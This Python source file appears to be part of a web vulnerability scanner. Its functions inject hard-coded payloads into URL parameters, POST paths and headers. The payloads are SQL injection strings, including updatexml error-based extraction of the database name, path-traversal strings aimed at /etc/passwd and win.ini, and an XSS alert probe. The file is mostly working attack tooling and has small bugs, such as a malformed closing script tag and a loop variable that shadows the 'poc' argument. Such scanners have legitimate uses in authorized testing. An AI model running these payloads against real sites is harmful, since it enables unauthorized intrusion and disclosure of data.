#!/user/bin/env python3
# -*- coding: utf-8 -*-
def attack_tihuan_url_canshu_work(__base_attack_url,poc):
    url_list = []
    sql_poc = [" AND 1=2 --+","1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)","1%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)", " OR NOT (1=2) --+", "\" AND 1=2 --+",
               "\" OR NOT (1=2) --+", "' AND 1=2 --+", "' OR NOT (1=2) --+", "%29%28%22%27","\" AND updatexml(1,concat(0x7e,database(),0x7e),1)-- +",")%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)-- +"]
    dir_poc = ["/../../../../../../../../etc/passwd","../../../../../../../../etc/passwd",'/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd','/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/windows/win.ini',"/../../../../../../../C:/windows/win.ini"]
    for i in __base_attack_url:
        baseurl_cs = i.split('=')[1]
        base_poc = []
        baseurl_other = i.split('=')[2:]
        if poc == "sql":
            if "&" in baseurl_cs:
                p = "&".join(baseurl_cs.split('&')[1:])
                for poc in sql_poc:
                    cs = poc + "&" + p
                    base_poc.append(cs)
            else:
                for poc in sql_poc:
                    cs = poc
                    base_poc.append(cs)
            for baseurl_cs in base_poc:
                baseurl = i.split('=')[0] + "=" + baseurl_cs
                if "=".join(baseurl_other):
                    baseurl = i.split('=')[0] + "=" + baseurl_cs + "=" + "=".join(baseurl_other)

                if baseurl not in url_list:
                    url_list.append(baseurl.strip())
                    # print(baseurl)
        if poc == "xss":
            if "&" in baseurl_cs:
                p = "&".join(baseurl_cs.split('&')[1:])
                baseurl_cs = "<script>alert(1)</scrip>" + "&" + p
            else:
                baseurl_cs = "<script>alert(1)</scrip>"

            baseurl = i.split('=')[0] + "=" + baseurl_cs
            if "=".join(baseurl_other):
                baseurl = i.split('=')[0] + "=" + baseurl_cs + "=" + "=".join(baseurl_other)
            if baseurl not in url_list:
                url_list.append(baseurl.strip())
                # print(baseurl)
        if poc == "file_read":
            if "&" in baseurl_cs:
                p = "&".join(baseurl_cs.split('&')[1:])
                for poc in dir_poc:
                    cs = poc + "&" + p
                    base_poc.append(cs)
            else:
                for poc in dir_poc:
                    cs = poc
                    base_poc.append(cs)
            for baseurl_cs in base_poc:
                baseurl = i.split('=')[0] + "=" + baseurl_cs
                if "=".join(baseurl_other):
                    baseurl = i.split('=')[0] + "=" + baseurl_cs + "=" + "=".join(baseurl_other)

                if baseurl not in url_list:
                    url_list.append(baseurl.strip())
    return url_list

def post_attack_tihuan_url_canshu_work(baseurl,data,poc):
    dir_poc = ["/../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd',
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/windows/win.ini',
               "/../../../../../../../C:/windows/win.ini"]
    sql_poc = [" AND 1=2 --+", "1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)",
               "1%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)", " OR NOT (1=2) --+", "\" AND 1=2 --+",
               "\" OR NOT (1=2) --+", "' AND 1=2 --+", "' OR NOT (1=2) --+", "%29%28%22%27",
               "\" AND updatexml(1,concat(0x7e,database(),0x7e),1)-- +",
               ")%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)-- +"]
    new_base_url = []

    for i in data:
        if poc == "sql":
            for s_poc in sql_poc:
                if i['path']:
                    if 'parmes' in i:
                        url = baseurl.strip("/ ") + "/" + i['path'].strip("/ ") + "&attack&" + f"=admin123&{s_poc}&".join(i['parmes']) + f"=admin123&{s_poc}"
                    else:
                        url = baseurl.strip("/ ") + "/" + i['path'].strip("/ ") + "&attack&" + f"=admin123{poc}"
                    if url not in new_base_url:
                        new_base_url.append(url)
        if poc == "dir":
            for f_poc in dir_poc:
                if i['path']:
                    if 'parmes' in i:
                        url = baseurl.strip("/ ") + "/" + i['path'].strip("/ ") + "&attack&" + f"=admin123{f_poc}&".join(i['parmes']) + f"=admin123{f_poc}"
                    else:
                        url = baseurl.strip("/ ") +"/"+ i['path'].strip("/ ") + "&attack&" + f"=admin123{poc}"
                    if url not in new_base_url:
                        new_base_url.append(url)
        if poc == "xss":
            if i['path']:
                if 'parmes' in i:
                    url = baseurl.strip("/ ") +"/"+ i['path'].strip("/ ") + "&attack&" + f"=admin123<script>alert(1)</script>&".join(i['parmes']) + f"=admin123<script>alert(1)</script>&"
                else:
                    url = baseurl.strip("/ ") +"/"+ i['path'].strip("/ ") + "&attack&" + f"=admin123<script>alert(1)</script>"
                if url not in new_base_url:
                    new_base_url.append(url)

    return new_base_url if new_base_url else None

def _header_attack_tihuan_url_canshu_work(poc):
    dir_poc = ["/../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd',
               '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/windows/win.ini',
               "/../../../../../../../C:/windows/win.ini"]
    sql_poc = [" AND 1=2 --+", "1%20AND%20updatexml(1,concat(0x7e,database(),0x7e),1)",
               "1%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)", " OR NOT (1=2) --+", "\" AND 1=2 --+",
               "\" OR NOT (1=2) --+", "' AND 1=2 --+", "' OR NOT (1=2) --+", "%29%28%22%27",
               "\" AND updatexml(1,concat(0x7e,database(),0x7e),1)-- +",
               ")%20OR%20updatexml(1,concat(0x7e,database(),0x7e),1)-- +"]

    if poc == "sql":
        return sql_poc
    if poc == "xss":
        return "<script>alert(1)</script>"
    if poc == "dir":
        return dir_poc
